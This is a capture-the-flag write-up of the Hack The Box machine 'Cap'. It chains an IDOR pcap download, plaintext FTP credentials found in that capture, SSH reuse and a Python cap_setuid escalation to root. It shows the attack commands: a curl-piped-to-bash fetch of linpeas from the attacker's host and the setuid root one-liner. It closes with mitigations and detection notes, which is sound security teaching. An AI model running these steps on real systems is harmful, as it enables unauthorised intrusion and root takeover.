HTB - Cap

A packet-capture dashboard leaks another user's FTP login via IDOR, and a stray Linux capability on Python hands over root.

Platform

Root cause
IDOR leading to credential leak + Linux capability misconfiguration (cap_setuid)

Enumeration

Mapping the attack surface

A full TCP port sweep turned up three services: FTP (21), SSH (22), and an HTTP server on port 80 running Gunicorn, indicating a Python-backed web application.

nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245

Anonymous FTP login was disabled, ruling out the obvious entry point. The web app turned out to be a network-monitoring dashboard exposing admin-style functionality: an IP Config page (raw ifconfig output), a Network Status page (raw netstat output), and a Security Snapshot feature that generates and lets you download a packet capture (pcap).

The IDOR

Sequential IDs, no ownership check

Generating a new capture produces a URL of the form /data/<id>, where the id increments with each capture created. That pattern strongly suggests earlier captures -- created by other users or by the app itself during setup -- are still sitting on disk and reachable simply by requesting a lower id, with no check that the requester actually owns that capture.

curl http://10.10.10.245/data/0 -o capture0.pcap
Mechanism first

This is a textbook Insecure Direct Object Reference: the application uses a predictable, sequential identifier to locate a resource and trusts whatever ID appears in the URL, instead of binding the resource to the authenticated session/user that created it. Any authenticated (or even unauthenticated) user can walk the ID space and pull other users' data.

Foothold

Plaintext creds inside the leaked capture

Capture ID 0 opened cleanly in Wireshark and contained FTP authentication traffic. Because FTP transmits credentials unencrypted, the full username and password were sitting in plaintext inside the packet data.

Username: nathan
Password: Buck3tH4TF0RM3!

The same credentials were valid for SSH as well -- password reuse across services turned a single leaked capture into a full interactive shell.

ssh nathan@10.10.10.245
Privilege Escalation

A capability doing the job of SUID

Standard enumeration was run to hunt for a privesc path.

# attacker box
python3 -m http.server 80

# target
curl http://10.10.14.x/linpeas.sh | bash

The scan flagged that /usr/bin/python3.8 carries non-default Linux capabilities -- specifically cap_setuid and cap_net_bind_service -- rather than the SUID bit.

getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+ep
Mechanism first

cap_net_bind_service was almost certainly granted so the web app could bind to a low port or handle raw sockets for packet capture without running the entire service as root. But cap_setuid was bundled alongside it, and that capability lets any process holding it call setuid() directly and become UID 0 -- functionally identical to a SUID-root binary, just implemented through the capability system instead of the classic file permission bit.

Because Python itself holds the capability, dropping into a Python interpreter and calling the syscall directly is enough to become root:

python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# root@cap:~# id
# uid=0(root) gid=0(root) groups=0(root)
Closing Thoughts

Two small oversights, one full compromise

Neither step here required a memory-corruption bug or exotic technique -- Cap is a clean demonstration of how authorization gaps and over-broad privilege grants chain together just as effectively as software exploits.

  • IDOR: any endpoint referencing a resource by a predictable, sequential ID needs authorization tied to the requester's session, not merely a check that the ID exists.
  • Plaintext protocols: FTP, Telnet, and similar clear-text protocols leak credentials to anyone who can capture or replay the traffic; password reuse across services then multiplies the blast radius of a single leak.
  • Linux capabilities: they're a more surgical alternative to full SUID/root, but capabilities like cap_setuid on any general-purpose interpreter (Python, Perl, Node, etc.) are effectively a root shell waiting to happen.

Detection notes

  • Alert on sequential/enumerable resource IDs being accessed outside a user's own session history.
  • Periodically audit for binaries with cap_setuid, cap_setgid, or other high-impact capabilities (getcap -r /), especially on interpreters.
  • Monitor for anonymous or plaintext-protocol traffic capture/replay on hosts that also expose web-based admin tooling.
